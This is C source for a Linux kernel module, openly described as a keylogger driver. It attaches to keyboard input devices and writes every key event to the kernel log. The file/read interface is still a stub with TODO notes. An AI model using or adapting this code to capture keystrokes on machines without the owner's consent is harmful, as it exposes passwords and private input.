/*
 * kbdlogger driver
 *
 * Copyright (C) 2014 Rafael do Nascimento Pereira <rnp@25ghz.net>
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * Keylogger driver - capture keypress events
 *
 */

#define pr_fmt(fmt) KBUILD_MODNAME ": " fmt

#include <linux/init.h>
#include <linux/module.h>
#include <linux/input.h>
#include <linux/device.h>
#include <linux/slab.h>
#include <linux/types.h>
#include <linux/fs.h>
#include <linux/cdev.h>
#include <linux/kobject.h>
#include <linux/time.h>
#include <linux/platform_device.h>
#include <linux/uaccess.h>
#include <linux/major.h>
#include <linux/wait.h>
#include <linux/sched.h>
#include <linux/input/mt.h>
#include <linux/hrtimer.h>
#include <linux/timer.h>
#include <linux/ktime.h>


#include <linux/poll.h>
#include <linux/vmalloc.h>
#include <linux/mm.h>
#include <linux/init.h>
#include <linux/input/mt.h>
#include <linux/major.h>
#include <linux/device.h>


MODULE_AUTHOR("Rafael do Nascimento Pereira <rnp@25ghz.net>");
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Input driver keyboard logger");

#define NUMDEVS  1
#define DEVNAME  "kbdlogger"

#define KBLDEV_MINOR_BASE	64
#define KBLDEV_MINORS		32
#define KBLDEV_MIN_BUFFER_SIZE	64U
#define KBLDEV_BUF_PACKETS	8

const char *kbdstr = "keyboard";

struct kbldev {
	struct input_handle handle;
	struct device dev;
	struct cdev cdev;
	struct mutex mutex;
	struct input_event kbdevent;
	wait_queue_head_t wait;
	bool exist;
};

struct client {
	struct fasync_struct *fasync;
	struct kbldev *kbldev;
	struct input_event kbdevent;
};

static ssize_t kbldev_read(struct file *file, char __user *buffer,
			   size_t count, loff_t *ppos)
{
	return 0;
}

static int kbldev_release(struct inode *inode, struct file *file)
{
	return 0;
}


static int kbldev_open(struct inode *inode, struct file *file)
{
	//struct kbldev *kbldev = container_of(inode->i_cdev, struct kbldev, cdev);

	return 0;
}

static const struct file_operations kbldev_fops = {
	.owner    = THIS_MODULE,
	.open     = kbldev_open,
	.read     = kbldev_read,
	.release  = kbldev_release,
};


static void kbldev_free(struct device *dev)
{
	struct kbldev *kbldev = container_of(dev, struct kbldev, dev);

	input_put_device(kbldev->handle.dev);
	kfree(kbldev);
}

static void kbldev_mark_dead(struct kbldev *kbldev)
{
	mutex_lock(&kbldev->mutex);
	kbldev->exist = false;
	mutex_unlock(&kbldev->mutex);
}

static void kbdlogger_cleanup(struct kbldev *kbldev)
{
	struct input_handle *handle = &kbldev->handle;
	if (!kbldev)
		return;

	kbldev_mark_dead(kbldev);
	//wake_up_interruptible(&kbldev->wait);
	cdev_del(&kbldev->cdev);

	if (handle) {
		input_flush_device(handle, NULL);
		input_close_device(handle);
	} else
		pr_err("input device already NULL\n");
}

static int kbdlogger_connect(struct input_handler *handler,
			     struct input_dev *dev,
			     const struct input_device_id *id)
{
	int error;
	int minor;
	int dev_no;
	struct kbldev *kbldev;

	/* if the device is not a keyboard it is filtered out. */
	if (!strstr(dev->name, kbdstr))
		return 0;

	minor = input_get_new_minor(KBLDEV_MINOR_BASE, KBLDEV_MINORS, true);
	if (minor < 0) {
		error = minor;
		pr_err("failed to reserve new minor: %d\n", error);
		return error;
	}

	kbldev = kzalloc(sizeof(struct kbldev), GFP_KERNEL);
	if (!kbldev) {
		error = -ENOMEM;
		goto err_free_minor;
	}

	mutex_init(&kbldev->mutex);
	// TODO: enable later init_waitqueue_head(&kbldev->wait);

	dev_no = minor;
	/* Normalize device number if it falls into legacy range */
	if (dev_no < KBLDEV_MINOR_BASE + KBLDEV_MINORS)
		dev_no -= KBLDEV_MINOR_BASE;
	dev_set_name(&kbldev->dev, "event%d", dev_no);

	kbldev->handle.dev = input_get_device(dev);  /* input_dev */
	kbldev->handle.name = dev_name(&kbldev->dev);
	kbldev->handle.handler = handler;
	kbldev->handle.private = kbldev;

	kbldev->dev.devt = MKDEV(INPUT_MAJOR, minor);
	kbldev->dev.class = &input_class;
	kbldev->dev.parent = &dev->dev; /* &(input_dev)->dev */
	kbldev->dev.release = kbldev_free;
	device_initialize(&kbldev->dev);

	error = input_register_handle(&kbldev->handle);
	if (error)
		goto err_free_kbldev;

	cdev_init(&kbldev->cdev, &kbldev_fops);
	kbldev->cdev.kobj.parent = &kbldev->dev.kobj;
	error = cdev_add(&kbldev->cdev, kbldev->dev.devt, 1);
	if (error)
		goto err_unregister_handle;

	error = device_add(&kbldev->dev);
	if (error)
		goto err_cleanup_kbldev;

	/* TODO: this function must be moved to kbl_open() */
	error = input_open_device(&kbldev->handle);
	if (error)
		goto err_cleanup_kbldev;

	pr_info("Added device %s\n", dev_name(&kbldev->dev));

	pr_info("Connected to device %s (%s at %s)\n",
		dev_name(&dev->dev),
		dev->name ?: "unknown",
		dev->phys ?: "unknown");

	return 0;

err_cleanup_kbldev:
	kbdlogger_cleanup(kbldev);
err_unregister_handle:
	input_unregister_handle(&kbldev->handle);
err_free_kbldev:
	put_device(&kbldev->dev);
err_free_minor:
	input_free_minor(minor);
	return error;
}

static void kbdlogger_event(struct input_handle *handle, unsigned int type,
			unsigned int code, int value)
{
	struct kbldev *kbldev = handle->private;
	ktime_t time_mono;

	if (type == EV_KEY || type == EV_SYN) {
		pr_info("Key event. Dev: %s, Type: %d, Code: %d, Value: %d\n",
		dev_name(&handle->dev->dev), type, code, value);

		time_mono = ktime_get();

		kbldev->kbdevent.time = ktime_to_timeval(time_mono);
		kbldev->kbdevent.type = type;
		kbldev->kbdevent.code = code;
		kbldev->kbdevent.value = value;
	}
}

static void kbdlogger_disconnect(struct input_handle *handle)
{
	struct kbldev *kbldev = handle->private;

	device_del(&kbldev->dev);
	kbdlogger_cleanup(kbldev);

	input_free_minor(MINOR(kbldev->dev.devt));

	if (handle)
		input_unregister_handle(handle);
	else
		pr_err("input handle already NULL\n");

	put_device(&kbldev->dev);
	pr_info("Disconnected from device %s\n", dev_name(&handle->dev->dev));
}

static const struct input_device_id kbdlogger_ids[] = {
	{.driver_info = 1 },  /* driver_info = 1 ??  */
	{},
};

MODULE_DEVICE_TABLE(input, kbdlogger_ids);

static struct input_handler kbdlogger_handler = {
	.connect       = kbdlogger_connect,
	.disconnect    = kbdlogger_disconnect,
	.event         = kbdlogger_event,
	.id_table      = kbdlogger_ids,
	.legacy_minors = true,
	.name          = "kbdlogger_handler",
};

static int __init kbdlogger_init(void)
{
	int err;

	if (input_register_handler(&kbdlogger_handler)) {
		pr_err("Failed input handler register\n");
		err = -ENOMEM;
		goto fail;
	}

	pr_info("loaded %s\n", DEVNAME);
	return 0;
fail:
	pr_err("failed to init %s\n", DEVNAME);
	return err;
}

static void __exit kbdlogger_exit(void)
{
	input_unregister_handler(&kbdlogger_handler);
	pr_info("unloaded %s\n", DEVNAME);
}

module_init(kbdlogger_init);
module_exit(kbdlogger_exit);
